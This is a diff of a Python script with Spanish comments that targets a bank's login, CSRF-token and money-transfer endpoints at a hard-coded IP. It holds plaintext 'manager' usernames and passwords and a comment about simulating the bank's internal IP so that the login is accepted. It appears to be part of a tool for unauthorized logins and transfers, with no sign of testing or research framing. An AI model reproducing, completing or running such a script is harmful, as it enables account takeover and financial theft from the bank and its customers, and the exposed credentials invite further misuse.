@@ -3,12 +3,13 @@ import socket
 
 # --- CONFIGURACIÓN ---
 # login_url = "http://80.78.30.242:9181/auth/login"
-login_url = "http://80.78.30.242:9181/api/login"
+# login_url = "http://80.78.30.242:9181/api/login"
+login_url = "http://80.78.30.242:9181"
 transfer_url = "http://80.78.30.242:9181/api/transferencia"
 
 # Credenciales del gerente
-user = "markmur88"
-passwd = "Ptf8454Jd55"
+user = "493069k1"
+passwd = "bar1588623"
 
 # IP del servidor interno del banco donde creemos que se acepta el login desde ahí
 ip_interna_simulada = "80.78.30.242"  # Reemplaza con la verdadera IP que tienes del banco
@@ -36,7 +37,7 @@ session = requests.Session()
 session.headers.update(headers)
 
 # --- Paso 1: Obtener CSRF token ---
-csrf_url = "http://80.78.30.242:9181/oidc/token/"  # Cambia a un endpoint que genere token si es posible
+csrf_url = "http://80.78.30.242:9181"  # Cambia a un endpoint que genere token si es posible
 try:
     csrf_response = session.get(csrf_url)
     csrftoken_cookies = session.cookies.get("csrftoken")
